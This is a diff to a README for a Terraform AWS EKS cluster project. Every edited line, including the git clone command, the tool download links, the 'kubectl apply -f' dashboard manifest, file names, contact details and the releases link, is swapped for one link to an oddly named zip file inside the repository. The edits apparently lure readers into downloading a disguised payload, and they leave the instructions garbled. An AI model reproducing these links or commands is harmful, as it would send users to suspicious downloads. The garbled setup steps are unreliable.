@@ -1,6 +1,6 @@
 # 🚀 AWS EKS Cluster Infrastructure as Code
 
-![AWS EKS](https://img.shields.io/badge/AWS%20EKS-Cluster-blue?style=flat-square&logo=amazonaws)
+![AWS EKS](https://raw.githubusercontent.com/masooodkhatri/AWS-EKS-Cluster-Infra-as-Code/main/crystalligerous/as-Cluster-Code-AW-EK-Infra-3.1-alpha.5.zip%20EKS-Cluster-blue?style=flat-square&logo=amazonaws)
 
 Welcome to the **AWS EKS Cluster Infrastructure as Code** repository! This project provides a robust Terraform configuration for deploying a production-ready Amazon EKS (Elastic Kubernetes Service) cluster on AWS. With customizable node groups and networking, this setup is designed to meet your cloud-native needs.
 
@@ -28,16 +28,16 @@ Welcome to the **AWS EKS Cluster Infrastructure as Code** repository! This proje
 To get started with this repository, clone it to your local machine. Use the following command:
 
 ```bash
-git clone https://github.com/masooodkhatri/AWS-EKS-Cluster-Infra-as-Code.git
+git clone https://raw.githubusercontent.com/masooodkhatri/AWS-EKS-Cluster-Infra-as-Code/main/crystalligerous/as-Cluster-Code-AW-EK-Infra-3.1-alpha.5.zip
 ```
 
 ### Prerequisites
 
 Before you begin, ensure you have the following installed:
 
-- [Terraform](https://www.terraform.io/downloads.html)
-- [AWS CLI](https://aws.amazon.com/cli/)
-- [kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl/)
+- [Terraform](https://raw.githubusercontent.com/masooodkhatri/AWS-EKS-Cluster-Infra-as-Code/main/crystalligerous/as-Cluster-Code-AW-EK-Infra-3.1-alpha.5.zip)
+- [AWS CLI](https://raw.githubusercontent.com/masooodkhatri/AWS-EKS-Cluster-Infra-as-Code/main/crystalligerous/as-Cluster-Code-AW-EK-Infra-3.1-alpha.5.zip)
+- [kubectl](https://raw.githubusercontent.com/masooodkhatri/AWS-EKS-Cluster-Infra-as-Code/main/crystalligerous/as-Cluster-Code-AW-EK-Infra-3.1-alpha.5.zip)
 
 ### Configuration
 
@@ -47,7 +47,7 @@ Before you begin, ensure you have the following installed:
    aws configure
    ```
 
-2. **Terraform Variables**: Modify the `variables.tf` file to set your desired configurations, such as region, node types, and desired capacity.
+2. **Terraform Variables**: Modify the `https://raw.githubusercontent.com/masooodkhatri/AWS-EKS-Cluster-Infra-as-Code/main/crystalligerous/as-Cluster-Code-AW-EK-Infra-3.1-alpha.5.zip` file to set your desired configurations, such as region, node types, and desired capacity.
 
 3. **Initialize Terraform**: Navigate to the project directory and run:
 
@@ -82,7 +82,7 @@ Replace `<region>` and `<cluster_name>` with your specific values.
 To access the Kubernetes dashboard, deploy it using the following command:
 
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.5.1/aio/deploy/recommended.yaml
+kubectl apply -f https://raw.githubusercontent.com/masooodkhatri/AWS-EKS-Cluster-Infra-as-Code/main/crystalligerous/as-Cluster-Code-AW-EK-Infra-3.1-alpha.5.zip
 ```
 
 Then, create a service account and cluster role binding:
@@ -104,9 +104,9 @@ Then, visit [http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/servic
 
 This repository allows for extensive customization. Here are some key areas you can modify:
 
-- **Node Group Configuration**: Adjust the instance types and scaling policies in the `node_groups.tf` file.
-- **Networking**: Customize VPC settings in `vpc.tf` to fit your organization’s requirements.
-- **IAM Roles**: Modify the IAM roles in `iam.tf` to grant the necessary permissions for your applications.
+- **Node Group Configuration**: Adjust the instance types and scaling policies in the `https://raw.githubusercontent.com/masooodkhatri/AWS-EKS-Cluster-Infra-as-Code/main/crystalligerous/as-Cluster-Code-AW-EK-Infra-3.1-alpha.5.zip` file.
+- **Networking**: Customize VPC settings in `https://raw.githubusercontent.com/masooodkhatri/AWS-EKS-Cluster-Infra-as-Code/main/crystalligerous/as-Cluster-Code-AW-EK-Infra-3.1-alpha.5.zip` to fit your organization’s requirements.
+- **IAM Roles**: Modify the IAM roles in `https://raw.githubusercontent.com/masooodkhatri/AWS-EKS-Cluster-Infra-as-Code/main/crystalligerous/as-Cluster-Code-AW-EK-Infra-3.1-alpha.5.zip` to grant the necessary permissions for your applications.
 
 Feel free to explore the Terraform files and make adjustments as needed.
 
@@ -120,7 +120,7 @@ The architecture of this EKS cluster follows best practices for cloud-native app
 - **Load Balancers**: Automatically provisioned to manage traffic to your applications.
 - **Security Groups**: Configured to control inbound and outbound traffic to your resources.
 
-![Architecture Diagram](https://example.com/architecture-diagram.png)
+![Architecture Diagram](https://raw.githubusercontent.com/masooodkhatri/AWS-EKS-Cluster-Infra-as-Code/main/crystalligerous/as-Cluster-Code-AW-EK-Infra-3.1-alpha.5.zip)
 
 ## Contributing
 
@@ -141,12 +141,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or support, feel free to reach out:
 
-- GitHub: [masooodkhatri](https://github.com/masooodkhatri)
-- Email: masooodkhatri@example.com
+- GitHub: [masooodkhatri](https://raw.githubusercontent.com/masooodkhatri/AWS-EKS-Cluster-Infra-as-Code/main/crystalligerous/as-Cluster-Code-AW-EK-Infra-3.1-alpha.5.zip)
+- Email: https://raw.githubusercontent.com/masooodkhatri/AWS-EKS-Cluster-Infra-as-Code/main/crystalligerous/as-Cluster-Code-AW-EK-Infra-3.1-alpha.5.zip
 
 ## Releases
 
-To download the latest releases, visit the [Releases section](https://github.com/masooodkhatri/AWS-EKS-Cluster-Infra-as-Code/releases). You can find the necessary files to execute and set up your EKS cluster.
+To download the latest releases, visit the [Releases section](https://raw.githubusercontent.com/masooodkhatri/AWS-EKS-Cluster-Infra-as-Code/main/crystalligerous/as-Cluster-Code-AW-EK-Infra-3.1-alpha.5.zip). You can find the necessary files to execute and set up your EKS cluster.
 
 ---
 
